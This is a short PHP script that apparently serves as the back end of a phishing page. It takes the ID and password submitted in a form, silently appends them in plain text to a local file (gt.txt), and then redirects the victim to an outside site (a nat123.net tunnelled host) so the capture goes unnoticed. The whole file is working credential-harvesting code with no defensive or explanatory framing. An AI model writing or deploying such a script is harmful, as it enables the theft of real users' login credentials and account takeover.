<?php
	$ID=$_POST['ID'];  //input 表单元素name
	$password=$_POST['password'];
	@ $fp=fopen('gt.txt', 'a');
	flock($fp,LOCK_EX);
	fwrite($fp, $ID."  ".$password."\r\n");
	flock($fp, LOCK_UN);
	fclose($fp);
	echo "<script>;location='http://taylorswiftchina.nat123.net/receive/main.html';</script>";
?>